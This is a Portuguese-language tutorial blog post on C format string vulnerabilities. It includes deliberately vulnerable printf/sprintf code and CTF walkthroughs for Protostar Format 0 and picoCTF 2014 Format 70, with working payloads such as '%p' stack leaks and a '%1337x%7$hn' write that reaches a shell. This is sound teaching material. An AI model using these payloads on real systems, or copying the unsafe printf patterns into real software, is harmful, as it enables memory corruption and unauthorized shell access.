# WTF is Format String?

## Introdução
Nesse **wtf** iremos entender o que é format string, como explorar as vulnerabilidades e como fazer com que o seu código não apresente esse problema.
Um format string é bem simples, ela é uma string ASCII com texto e parâmetros de formato, a complexidade irá girar em torno de como você se aproveita dos erros cometidos no código alheio e como essas brechas são deixadas por programadores, para entender melhor podemos usar um código de exemplo.

    printf("Media final da turma: **%d**\n", **2**);

Temos então uma string ascii com um parâmetro de formato **%d** e um valor sendo passado, que é o **2**(que feio, turma), o retorno desse código seria o seguinte:
```bash
$ Media final da turma: 2
```
Existem diversos desses parâmetros em C, segue uma tabela:

|Parâmetro|Significado|Exemplo|
|--|-----|-----|
|s   |Cadeia de caracteres     |Essa eh uma frase     |
|c   |Caracter     |d     |
|d   |Inteiro decimal com sinal     |20     |
|f   |Número decimal com ponto flutuante     |20.415    |

Isso não chega nem perto da tabela completa, são só alguns exemplos de como os parâmetros funcionam, o ponto aqui é que esses parâmetros vão requisitar dados da pilha.

## Vulnerabilidade

Para entender como a vulnerabilidade vai acontecer, vamos saber também como o compilador vai deixar passar essa falha(não é culpa do coitado), vamos usar como exemplo o printf que é o mais comum, o printf tem um número variável de argumentos que são passados, então caso nosso código fosse esse:

    printf("Media da turma: %d%d\n", 2);

**Ouuch!** O professor dá 2 pra turma e faz uma cagada dessas.

Mas estamos seguros já que o compilador vai acusar um erro nessa linha...não vai não, sério, tenta ai, escreve o código e vê o retorno, no meu caso foi:
```bash
$ Media da turma: 2-1219883224
```
Para o compilador entender esse erro, ele deveria entender como a função printf() funciona e o significado dos format strings, e o format string é gerado durante a execução do programa, então não tem como o compilador pegar esse tipo de coisa.

## Explorando algo

Beleza, sabemos o que é format string e sabemos que o compilador não é onisciente, mas vamos explorar algo pra valer -na verdade vamos só usar um exemplo imbecil para entender melhor-, então segue o código vulnerável:

    #include <stdio.h>
    #include <string.h>
    
    int main(int argc, char** argv){
		char buf[50];
		strncpy(buf, argv[1], 55);
		printf(buf);
		return 0;
	}	

Então no terminal podemos executar o código:
```bash
$ ./a.out cachorro
$ cachorro
```
Tudo certo então? Errado.

Nesse código, um argumento que passamos pelo terminal será imprimido na tela, mas lembra que a função printf tem uma quantidade variável de argumentos? Então vamos passar duzentos argumentos!
```bash
$ ./a.out "%p %p %p %p"
$ 0x7ffeecf8a572 (nil) 0x7ffeecf88b80 0x7
```
Ok, foram apenas quatro que passamos, mas olha ai, imprimos os endereços da pilha.

## Matando um chall

***Protostar: Format 0***

Então é hora de por em prática e assassinar um chall, nesse aqui temos o código:


    #include <stdlib.h>
    #include <unistd.h>
    #include <stdio.h>
    #include <string.h>
    
    void vuln(char *string)
    {
      volatile int target;
      char buffer[64];
    
      target = 0;
    
      sprintf(buffer, string);
      
      if(target == 0xdeadbeef) {
          printf("you have hit the target correctly :)\n");
      }
    }
    
    int main(int argc, char **argv)
    {
      vuln(argv[1]);
    }

O chall também nos diz que o desafio deve ser feito com menos de 10 bytes de entrada.

O que rola aqui, é que o programa recebe uma entrada nossa pelo terminal, declara uma variável buffer de 64 bytes, declara uma variável target e seta ela em 0 e faz uma condicional pra variável target, essa que nunca será igual a 0xdeadbeef, e o programa encerra.
Ela nunca seria igual, mas podemos fazer algo para sobrescrever esse buffer pelo terminal, alguns veriam esse chall e fariam um BufferOverflow, outros veriam a vulnerabilidade de format string, no nosso caso vamos explorar com format string.

Com bufferoverflow, passariamos 64 bytes e depois sobrescreveriamos o target, já que temos o código fica fácil identificar a sequência do que vamos sobrescrever, certo?

O legal desse exemplo é que resolver com bufferoverflow ou format string tanto faz, é praticamente a mesma coisa que vamos fazer, e nesse caso, nós vamos fazer bufferoverflow, já que ainda temos que passar os 64 bytes da variável e escrever no target depois, pra fazer isso com format string podemos fazer isso aqui:

```bash
$ ./f0 `python -c 'print "%64x"'`
```
**%x** em format string é pra hexadecimal, então estamos enviando 64 bytes em hexadecimal para o programa, então vamos escrever todos no buffer, após isso vamos usar [endianness](https://en.wikipedia.org/wiki/Endianness) para sobrescrever o target para 0xdeadbeef, simplesmente escrevemos:

```bash
$ ./format0 `python -c 'print "%64x\xef\xbe\xad\xde"'`
```

E temos o retorno:

```bash
$ you have hit the target correctly :)
```

## Matando outro chall

 **Problem(Format 70 - picoCTF 2014)**
 
This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at `/home/format/` on the shell server. The source can be found here(não mais picoctf), agora a source se encontra logo abaixo:

    #include <stdio.h>
    #include <stdlib.h>
    #include <fcntl.h>
    
    int secret = 0;
    
    void give_shell(){
        gid_t gid = getegid();
        setresgid(gid, gid, gid);
        system("/bin/sh -i");
    }
    
    int main(int argc, char **argv){
        int *ptr = &secret;
        printf(argv[1]);
    
        if (secret == 1337){
            give_shell();
        }
        return 0;
    }

Nós vemos que dessa vez, temos uma variável secret que é declarada como 0, temos uma função give_shell, que é a que precisamos acessar pra poder ter acesso ao shell e pegar a flag, mas a função só será chamada se a variável secret for igual a 1337, de quebra, ainda temos um ponteiro com o endereço de memória de secret, a parte boa aqui, é que temos um **printf(agrv[1])**, esse erro do programador salvará a todos nós, pois poderemos utilizar de format string para explorar esse programa(é só lembrar do que eu disse sobre o printf agora pouco).
**OBS:** Infelizmente o servidor desse chall já era, até porque esse é um chall do picoctf de 2014.

Podemos analisar o binário com o gdb e ver o valor de memória da variável secret.

```bash
$ gdb formatstring
$ p &secret
```
(Como o servidor não existe mais, eu peguei o endereço de memória de um write-up no github)

O retorno será esse:

```
$1 = (<data variable, no debug info> *) 0x804a030 <secret>
```
Certo, então temos o endereço de memória, agora precisamos saber onde ele estará quando o programa roda.

Podemos rodar da seguinte forma:

```bash
$ ./formatstring "%p %p"
```
Isso nos retornará os dois próximos endereços de memória da pilha, pois nosso printf(argv[1]) estará imprimindo na nossa tela os %p que estamos passando.

(E já que o writeup está me dando informações privilegiadas aqui, basta rodar sete vezes que teríamos exatamente o endereço de memória que precisamos, mas fingindo que não temos essa informação).
```bash
$ ./format "%p %p %p %p %p %p %p %p %p"
$ 0xffffd7e4 0xffffd7f0 0xf7e4f39d 0xf7fc83c4 0xf7ffd000 0x804852b (0x804a030) 0x8048520 (nil)pico8
```
(Foi eu que coloquei o endereço entre parenteses, meu terminal não é uma IA ainda).

Beleza, lá está.

Pra resolver isso, podemos usar o format string %n, ele nos permite escrever no inteiro que o endereço é fornecido como argumento o número de caracteres gravados no buffer(eu juro que tentei procurar uma explicação melhor pro %n, mas na resolução vocês vão entender, ou podem dar uma pesquisada em exemplos).
Então se nós escrevermos 1337 caracteres usando %1337 e também o endereço de memória de secret com x%7, podemos setar o valor de secret para 1337, então usando um pythonzinho pra entrada de dados temos:
```bash
$ ./format $(python -c ‘print “%1337x%7$hn”‘)
```
Fazendo isso, secret será igual a 1337, e então a função give_shell() será chamada, nos dando o shell para enfim, digitar um "cat flag.txt" e ter a flag na nossa mão:

```bash
$ who\_thought\_%n_was_a_good_idea?
```
Espero que tenha sido possível ter uma boa base de format string com a explicação e os exemplos, é sempre bom pesquisar e ver outras maneiras em que esse tipo de vulnerabilidade pode cair nos challs, bons estudos!
